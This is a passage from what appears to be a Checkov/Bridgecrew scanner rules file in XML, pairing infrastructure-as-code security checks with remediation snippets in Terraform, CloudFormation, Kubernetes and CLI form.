<p>When Amazon MQ supports a new version of a broker engine, you can upgrade your broker instances to the new version. There are two kinds of upgrades: major version upgrades and minor version upgrades. Minor upgrades helps maintain a secure and stable MQ broker with minimal impact on the application. For this reason, we recommend that your automatic minor upgrade is enabled. Minor version upgrades only occur automatically if a minor upgrade replaces an unsafe version, such as a minor upgrade that contains bug fixes for a previous version.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Shell</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-shell theme-light" data-lang="shell" name="">aws mq update-broker \
  --region ${region} \
  --broker-id ${resource_id} \
  --auto-minor-version-upgrade
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources: 
  Example:
    Type: "AWS::AmazonMQ::Broker"
    Properties:
      BrokerName: example
      EngineType: ActiveMQ
      EngineVersion: "5.15.9"
      HostInstanceType: mq.t3.micro
+     AutoMinorVersionUpgrade: true
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_mq_broker" "example" {
  broker_name                = "example"
  engine_type                = "ActiveMQ"
  engine_version             = "5.15.9"
  host_instance_type         = "mq.t3.micro"
+ auto_minor_version_upgrade = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-mqbrokers-minor-version-updates-are-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-mqbrokers-minor-version-updates-are-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-mqbrokers-minor-version-updates-are-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_235</key>
    <name>Ensure AWS copied AMIs are encrypted</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-copied-amis-are-not-encrypted"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-copied-am-is-are-not-encrypted"></div>AWS copied AMIs are not encrypted</div><a aria-label="Skip link to AWS copied AMIs are not encrypted" class="heading-anchor-icon fa fa-anchor" href="#aws-copied-amis-are-not-encrypted"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-aws-copied-amis-are-encrypted' target='_blank'> https://docs.bridgecrew.io/docs/ensure-aws-copied-amis-are-encrypted</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-aws-copied-amis-are-encrypted' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_OPENSTACK_5</key>
    <name>Ensure OpenStack firewall rule has destination IP configured</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="openstack-firewall-rule-does-not-have-destination-ip-configured"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-open-stack-firewall-rule-does-not-have-destination-ip-configured"></div>OpenStack firewall rule does not have destination IP configured</div><a aria-label="Skip link to OpenStack firewall rule does not have destination IP configured" class="heading-anchor-icon fa fa-anchor" href="#openstack-firewall-rule-does-not-have-destination-ip-configured"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Explicitly setting a destination IP Address will make sure that the IP destination is managed in code. You also need to ensure that the destination IP is not 0.0.0.0 so that the firewall rule is exposed to the world.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> openstack_fw_rule_v1</li>
<li><strong>Arguments:</strong> destination_ip_address</li>
</ul>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-Go theme-light" data-lang="Go" name="">resource "openstack_fw_rule_v1" "fail" {
  name             = "my_rule_world"
  description      = "let anyone in"
  action           = "allow"
  protocol         = "tcp"
  destination_port = "22"
  enabled          = "true"
+  destination_ip_address = "10.0.0.1"
}
</code></pre>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli"></div>CLI</div><a aria-label="Skip link to CLI" class="heading-anchor-icon fa fa-anchor" href="#cli"></a></h2>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">openstack firewall group rule create --destination-ip-address 10.0.0.1
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-openstack-firewall-rule-has-destination-ip-configured' target='_blank'> https://docs.bridgecrew.io/docs/ensure-openstack-firewall-rule-has-destination-ip-configured</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-openstack-firewall-rule-has-destination-ip-configured' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_177</key>
    <name>Ensure Kinesis Video Stream is encrypted by KMS using a customer managed Key (CMK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="policy-title"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-policy-title"></div>[Policy Title]</div><a aria-label="Skip link to [Policy Title]" class="heading-anchor-icon fa fa-anchor" href="#policy-title"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This is a simple check to ensure that Kinesis Video Stream is using AWS key management - KMS to encrypt its contents. To resolve add the ARN of your KMS or link on creation of the cluster.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li>Resource: aws_kinesis_video_stream</li>
<li>Attribute: kms_key_id - (Optional) The ID of the AWS Key Management Service (AWS KMS) key that you want Kinesis Video Streams to use to encrypt stream data. If no key ID is specified, the default, Kinesis Video-managed key (aws/kinesisvideo) is used.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_kinesis_video_stream" "default" {
  name                    = "terraform-kinesis-video-stream"
  data_retention_in_hours = 1
  device_name             = "kinesis-video-device-name"
  media_type              = "video/h264"
  + kms_ke_id                             = "ckv_kms"
  tags = {
    Name = "terraform-kinesis-video-stream"
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_general_97' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_general_97</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_general_97' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AZURE_19</key>
    <name>Ensure Azure Synapse workspaces have no IP firewall rules attached</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-synapse-workspaces-have-ip-firewall-rules-attached"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-synapse-workspaces-have-ip-firewall-rules-attached"></div>Azure Synapse workspaces have IP firewall rules attached</div><a aria-label="Skip link to Azure Synapse workspaces have IP firewall rules attached" class="heading-anchor-icon fa fa-anchor" href="#azure-synapse-workspaces-have-ip-firewall-rules-attached"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_synapse_firewall_rule, azurerm_resource_group, azurerm_synapse_workspace</li>
<li><strong>Argument:</strong> synapse_workspace_id (of <em>azurerm_synapse_firewall_rule</em> )</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_resource_group" "example" {
  name     = "example-resources"
  location = "West Europe"
}

resource "azurerm_synapse_workspace" "workspace_good" {
  name                                 = "example"
  sql_administrator_login              = "sqladminuser"
  sql_administrator_login_password     = "<a class="__cf_email__" data-cfemail="a7efe7f4cf96e4c8f594" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>!"
  managed_virtual_network_enabled      = true
  tags = {
    Env = "production"
  }
}


resource "azurerm_synapse_firewall_rule" "firewall_rule" {
  name                 = "AllowAll"
  synapse_workspace_id = azurerm_synapse_workspace.workspace_bad.id
  start_ip_address     = "0.0.0.0"
  end_ip_address       = "255.255.255.255"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-azure-synapse-workspaces-have-no-ip-firewall-rules-attached' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-azure-synapse-workspaces-have-no-ip-firewall-rules-attached</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-azure-synapse-workspaces-have-no-ip-firewall-rules-attached' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_179</key>
    <name>Ensure FSX Windows filesystem is encrypted by KMS using a customer managed Key (CMK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-fsx-windows-filesystem-not-encrypted-using-customer-managed-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-fsx-windows-filesystem-not-encrypted-using-customer-managed-key"></div>AWS FSX Windows filesystem not encrypted using Customer Managed Key</div><a aria-label="Skip link to AWS FSX Windows filesystem not encrypted using Customer Managed Key" class="heading-anchor-icon fa fa-anchor" href="#aws-fsx-windows-filesystem-not-encrypted-using-customer-managed-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This is a simple check to ensure that FSX Windows file system is using AWS key management - KMS to encrypt its contents. To resolve add the ARN of your KMS or link on creation of the cluster</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_fsx_windows_file_system</li>
<li><strong>Attribute</strong>:  kms_key_id</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_fsx_windows_file_system" "example" {
  active_directory_id = aws_directory_service_directory.example.id
  kms_key_id          = aws_kms_key.example.arn
  storage_capacity    = 300
  subnet_ids          = [aws_subnet.example.id]
  throughput_capacity = 1024
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_general_99' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_general_99</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_general_99' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_180</key>
    <name>Ensure Image Builder component is encrypted by KMS using a customer managed Key (CMK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-image-builder-component-not-encrypted-using-customer-managed-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-image-builder-component-not-encrypted-using-customer-managed-key"></div>AWS Image Builder component not encrypted using Customer Managed Key</div><a aria-label="Skip link to AWS Image Builder component not encrypted using Customer Managed Key" class="heading-anchor-icon fa fa-anchor" href="#aws-image-builder-component-not-encrypted-using-customer-managed-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This is a simple check to ensure that Image builder component is using AWS key management - KMS to encrypt its contents. To resolve add the ARN of your KMS or link on creation of the component.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li>Resource: aws_imagebuilder_component</li>
<li>Attribute: kms_key_id - (Optional) Amazon Resource Name (ARN) of the Key Management Service (KMS) Key used to encrypt the component.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_imagebuilder_component" "example" {
  data = yamlencode({
    phases = [{
      name = "build"
      steps = [{
        action = "ExecuteBash"
        inputs = {
          commands = ["echo 'hello world'"]
        }
        name      = "example"
        onFailure = "Continue"
      }]
    }]
    schemaVersion = 1.0
  })
  name     = "example"
  platform = "Linux"
  version  = "1.0.0"
  kms_key_id = "ckv_kms"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_aws_general_100' target='_blank'> https://docs.bridgecrew.io/docs/bc_aws_general_100</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_aws_general_100' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_K8S_4</key>
    <name>Do not admit containers wishing to share host network namespace</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="containers-wishing-to-share-host-network-namespace-admitted"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-containers-wishing-to-share-host-network-namespace-admitted"></div>Containers wishing to share host network namespace admitted	</div><a aria-label="Skip link to Containers wishing to share host network namespace admitted	" class="heading-anchor-icon fa fa-anchor" href="#containers-wishing-to-share-host-network-namespace-admitted"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>In a Kubernetes cluster, every pod gets its own IP address. Pods can be treated much like VMs or physical hosts from the perspectives of port allocation, naming, service discovery, load balancing, application configuration, and migration. </p>
<p>Sharing the host network namespace breaks the isolation between container images and can make the host visible to other containers in the pod. In some cases, pods in the host network of a node can communicate with all pods on all nodes without using network address translation (NAT).</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="kubernetes"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-kubernetes"></div>Kubernetes</div><a aria-label="Skip link to Kubernetes" class="heading-anchor-icon fa fa-anchor" href="#kubernetes"></a></h2>
<ul>
<li><strong>Resource</strong>: PodSecurityPolicy</li>
<li><strong>Argument</strong>: hostNetwork (Optional)<br/>
When set to false, Pods are unable to use their host's network namespace.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: &lt;policy name&gt;
spec:
+ hostNetwork: false
</code></pre></div></div>
<p>To use a <strong>PodSecurityPolicy</strong> resource, the requesting user or target pod&#8217;s service account must be authorized to use the policy. The preferred method is to grant access to the service account. In the following example we use <strong>RBAC</strong>, a standard Kubernetes authorization mode.</p>
<p>A <strong>Role</strong> or <strong>ClusterRole</strong> needs to grant access to <strong>use</strong> the desired policies. </p>
<p><strong>Kind</strong>: ClusterRole</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: &lt;role name&gt;
rules:
- apiGroups: ['policy']
  resources: ['podsecuritypolicies']
  verbs:     ['use']
  resourceNames:
  - &lt;policy name&gt;
</code></pre></div></div>
<p>The <strong>ClusterRole</strong> is then bound to the authorized service(s):</p>
<p><strong>Kind</strong>: ClusterRoleBinding</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: &lt;binding name&gt;
roleRef:
  kind: ClusterRole
  name: &lt;role name&gt;
  apiGroup: rbac.authorization.k8s.io
subjects:
- kind: ServiceAccount
  name: &lt;authorized service account name&gt;
  namespace: &lt;authorized pod namespace&gt;
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_k8s_4' target='_blank'> https://docs.bridgecrew.io/docs/bc_k8s_4</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_k8s_4' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_119</key>
    <name>Ensure network interfaces do not use public IPs</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="network-interfaces-use-public-ips"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-network-interfaces-use-public-i-ps"></div>Network interfaces use public IPs</div><a aria-label="Skip link to Network interfaces use public IPs" class="heading-anchor-icon fa fa-anchor" href="#network-interfaces-use-public-ips"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_network_interface</li>
<li><strong>Argument:</strong> ip_configuration.public_ip_address_id (not exists)</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_network_interface" "example" {
                  name                = "example-nic"
                  location            = azurerm_resource_group.example.location
                  resource_group_name = azurerm_resource_group.example.name
                
                  ip_configuration {
                    name                          = "internal"
                    subnet_id                     = azurerm_subnet.example.id
                    private_ip_address_allocation = "Dynamic"
                  }       
                    ip_configuration {
                    name                          = "internal2"
                    subnet_id                     = azurerm_subnet.example.id2
                    private_ip_address_allocation = "Dynamic"
                  }
                  enable_ip_forwarding = false
                }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-network-interfaces-dont-use-public-ips' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-network-interfaces-dont-use-public-ips</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-network-interfaces-dont-use-public-ips' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_182</key>
    <name>Ensure Doc DB is encrypted by KMS using a customer managed Key (CMK)</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws--doc-db-not-encrypted-using-customer-managed-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-doc-db-not-encrypted-using-customer-managed-key"></div>AWS  Doc DB not encrypted using Customer Managed Key</div><a aria-label="Skip link to AWS  Doc DB not encrypted using Customer Managed Key" class="heading-anchor-icon fa fa-anchor" href="#aws--doc-db-not-encrypted-using-customer-managed-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This is a simple check to ensure that the DocDB is using AWS key management - KMS to encrypt its contents. To resolve add the ARN of your KMS or link on creation of the cluster.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: aws_docdb_cluster</li>
<li><strong>Argument</strong>: kms_key_id - (Optional) The ARN for the KMS encryption key. When specifying kms_key_id, storage_encrypted needs to be set to true.</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_docdb_cluster" "docdb" {
  cluster_identifier      = "my-docdb-cluster"
  engine                  = "docdb"
  master_username         = "foo"
  master_password         = "mustbeeightchars"
